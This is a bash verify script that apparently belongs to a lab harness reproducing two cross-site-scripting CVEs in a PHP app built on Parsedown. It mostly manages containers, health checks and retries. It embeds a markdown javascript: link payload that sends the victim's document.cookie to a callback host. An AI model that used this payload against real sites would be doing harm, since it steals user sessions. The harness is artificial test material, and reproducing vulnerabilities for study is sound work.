#!/usr/bin/env bash
# verify.sh --seed|--residual
# seed     : CVE-2026-27568 raw-HTML <a href='javascript:...'> (original_poc.py)
# residual : CVE-2026-33500 markdown [CLICKME](javascript:...) (inline; no hidden files)
# Effect = callback /dump contains the CURRENT RUN_FLAG (victim cookie exfil). Each branch exits once.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# Ignore leftover controller PORT_*; this run's compose.env + published mapping win.
unset PORT_V0_0 PORT_V1_0 PORT_V2_0 PORT_CALLBACK_0 PORT_VICTIM_0
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

_cport() {
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    --profile "$VERSION" port "$1" "$2" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]'
}

PORT=""; VPORT=""; CPORT2=""
for _ in 1 2 3 4; do
  PORT="$(_cport "$VERSION" 80)"
  VPORT="$(_cport victim 8070)"
  CPORT2="$(_cport callback 9000)"
  if [[ -n "$PORT" && -n "$VPORT" && -n "$CPORT2" ]]; then
    break
  fi
  echo "verify: ports missing (app=$PORT victim=$VPORT cb=$CPORT2), recreate victim" >&2
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    --profile "$VERSION" up -d --no-deps --no-build --pull never victim || true
  sleep 8
done
if [[ -z "$PORT" || -z "$VPORT" || -z "$CPORT2" ]]; then
  echo "verify: compose port failed (need --profile $VERSION) app=$PORT victim=$VPORT cb=$CPORT2" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT" PCB_VICTIM_PORT="$VPORT" PCB_CALLBACK_PORT="$CPORT2"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

READY=0
for _ in $(seq 1 60); do
  acode="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${PORT}/" || true)"
  vhealth="$(curl -sS --max-time 5 "http://127.0.0.1:${VPORT}/health" || true)"
  chealth="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${CPORT2}/health" || true)"
  if [[ "$acode" == "200" && "$vhealth" == "ok" && "$chealth" == "200" ]]; then
    READY=1
    break
  fi
  sleep 3
done
[[ "$READY" == 1 ]] || { echo "verify: env not ready app=$PORT victim=$VPORT cb=$CPORT2" >&2; exit 20; }

PROOF="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
  --profile "$VERSION" exec -T "$VERSION" sh -c \
  'test -f /app/objects/functionsSecurity.php && test -f /app/vendor/erusev/parsedown/Parsedown.php && git -C /app rev-parse HEAD && git -C /app remote get-url origin' \
  2>/dev/null)" || { echo "verify: clone proof failed" >&2; exit 20; }
echo "clone_proof=$(printf '%s' "$PROOF" | tr '\n' ' ')"

if [[ "$MODE" == "--seed" ]]; then
  # Retry a few times for first-click flake. Stop early on a clean hit.
  # If every attempt runs but never sees THIS RUN_FLAG -> blocked/wrong (10).
  # Only rc=20 when every attempt crashed (real env death).
  OUT=""
  ANY_CLEAN=0
  for _ in 1 2; do
    OUT="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>&1)" && RC=0 || RC=$?
    if [[ "$RC" -eq 0 ]]; then
      ANY_CLEAN=1
      echo "${OUT:0:500}"
      if [[ "$OUT" == *"$RUN_FLAG"* ]]; then exit 0; fi
    fi
    sleep 4
  done
  if [[ "$ANY_CLEAN" == 1 ]]; then
    exit 10
  fi
  echo "${OUT:0:500}" >&2
  echo "$OUT" >&2
  exit 20
fi

# residual: markdown javascript: link. Parsedown core inlineLink() is not overridden on V1
# (sanitizeATag only covers raw HTML <a>). Same sink + victim click + callback dump.
"$PY" - > "$WORK_DIR/cand.json" <<'PYEOF'
import json
print(json.dumps({
    "probe_id": "cve-2026-33500-markdown-js-link",
    "payload": '[CLICKME](javascript:document.location="//callback:9000/c?f="+document.cookie)',
}))
PYEOF
OUT=""
ANY_CLEAN=0
for _ in 1 2 3; do
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" && RC=0 || RC=$?
  if [[ "$RC" -eq 0 ]]; then
    ANY_CLEAN=1
    echo "${OUT:0:500}"
    if grep -qF -- "$RUN_FLAG" <<<"$OUT"; then exit 0; fi
  else
    echo "verify: residual probe crashed, recreate victim" >&2
    docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
      --profile "$VERSION" up -d --no-deps --no-build --pull never victim || true
  fi
  sleep 5
done
if [[ "$ANY_CLEAN" == 1 ]]; then
  exit 10
fi
echo "${OUT:0:500}" >&2
exit 20
